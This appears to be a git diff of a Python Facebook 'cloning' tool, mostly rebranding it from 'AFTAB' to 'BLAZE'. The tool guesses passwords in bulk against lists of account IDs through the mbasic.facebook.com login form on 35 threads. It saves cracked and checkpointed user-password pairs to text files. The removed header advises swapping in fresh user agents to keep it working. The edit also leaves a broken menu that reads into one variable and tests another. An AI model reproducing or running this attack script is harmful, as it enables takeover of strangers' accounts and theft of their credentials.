@@ -1,79 +1,4 @@
-#coding=utf-8
-#!/usr/bin/python3
-"""
-hello friends kese ho this is mr.Aftab
-to i hope ap sab thik honge 
-ajkal facebook ke sc ke ander method change krne ki zrorat ni
-q ke en 3 mounth se facebook ke ander m.basic chalta hai
-like facrbook ke all method again working bas 1 kam krna phrta hai
-Fresh user ugent kahi se dhondo or eske userugent change krlo
-then uske bad sc full lush hoga.
-agar kisi ko userugent ni milte muj se contact krlo mai deta hon
-Facebook acount name :- M R Aftab
-thanks :- allah hafiz
-"""
-#new userugrnt u can use this-----#
-"""
-Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-X415S Build/OPM1.171019.026)
 
-  Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVX21B Build/RTM5.220609.268)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; 21121210G Build/UKQ1.230917.001)
-
-  Dalvik/2.1.0 (Linux; U; Android 9; HiDPTAndroid Hi3751V560 Build/PPR1.180610.011)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; NSTV FF Build/RTT2.220103.001)
-
-  Dalvik/2.1.0 (Linux; U; Android 9.0; HTZM-10 Build/O00623)
-
-  Dalvik/2.1.0 (Linux; U; Android 9; 8A001_A3 Build/PPR1.180610.011)
-
-  Dalvik/2.1.0 (Linux; U; Android 10.0; x96 Lite Build/QP1A.191105.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; XS97 R3 Build/QP1A.191105.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; Xiaomi Watch 2 Pro Build/RWS2.221020.001.XM182.REL)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/AP21.240119.009)
-
-  Dalvik/2.1.0 (Linux; U; Android 12.0; Q96MAX Build/NHG47L)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; MI 8 Build/SQ3A.220705.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SmartT23 Build/SP1A.210812.016)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; T609L Build/TP1A.220624.014)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (2022) Build/RRDES31.Q3-73-22-17)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SMART_TV Build/SP1A.210812.016)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; moto e(7) plus Build/QPZ30.30-Q3-38-25)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; 22041219NY Build/UP1A.231005.007)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; myPhone Jet Build/SP1A.210812.016)
-  
-  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RQ3A.210805.019)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.021)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1B.191205.042)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.039)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SGP321 Build/SQ3A.220705.018)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ2A.200501.007)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QP1A.190711.044)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1A.200105.047)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RP1A.201005.003)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QD4A.200805.014)
-"""
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
@@ -305,20 +230,18 @@ def clear():
 	#
 def menu():
 	clear()
-	print('[1] File Cloning Auto  Pass  ')
-	print('[2] File Cloning Choice Pass ')
-	print('[3] Random number Cloning')
-	print('[4] File Create ')
+	print('[1] FILE CLONING AUTO PASS  ')
+	print('[2] FILE CLONING CHOICE PASS ')
 	print('[5] Exit')
 	linex()
 	Aftab=input('[•] Select Option :')
-	if Aftab =='1':
+	if BLAZE =='1':
 		__crack__().plerr()
-	if Aftab =='2':
+	if BLAZE =='2':
 		file()
-	if Aftab =='3':
+	if BLAZE =='3':
 		mrAftab()
-	if Aftab =='4':
+	if BLAZE =='4':
 		print('[•] For this scrpit contact with me');exit()
 	else:
 		print('[•] Select Right Option ');menu()
@@ -367,16 +290,16 @@ class __crack__:
             _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
-                print('\r\033[1;32m [AFTAB-Ok]\033[1;32m %s | %s      ' % (user,pw))
+                print('\r\033[1;32m [BLAZE-Ok]\033[1;32m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('AFTAB-Ok.txt','a').write('%s\n' % wrt)
+                open('BLAZE-Ok.txt','a').write('%s\n' % wrt)
                 break
             elif 'checkpoint' in ses.cookies.get_dict():
-                print('\r\033[1;31m [AFTAB-CP]\033[1;31m %s | %s      ' % (user,pw))
+                print('\r\033[1;31m [BLAZE-CP]\033[1;31m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('AFTAB-CP.txt','a').write('%s\n' % wrt)
+                open('BLAZE-CP.txt','a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -397,7 +320,7 @@ class __crack__:
             time.sleep(1)
             
             print('[•] Total Ids : %s ' % len(self.id))
-            print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
+            print('\x1b[1;91m[•] USE FLIGHT MODE FOR MORE ID')
             linex()
             with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                 for yntkts in self.id:
@@ -438,10 +361,10 @@ logo="""
                                                              
 \033[1;37m--------------------- \033[1;35m \033[1;37m---------------------
 
-\033[1;35m→ Owner   :RAZU HEROO\033[1;36m𓆩♡𓆪
-\033[1;35m→ Facebook:
-\033[1;35m→ Tool Type:FREE
-\033[1;35m→ Version :0.1
+\045[1;32m→ Owner   :RAZU HEROO\033[1;36m𓆩♡𓆪
+\045[1;32m→ Facebook:
+\045[1;32m→ Tool Type:FREE
+\045[1;32m→ Version :0.1
 
 \33[1;37m----------------------------------------------"""
 def linex():
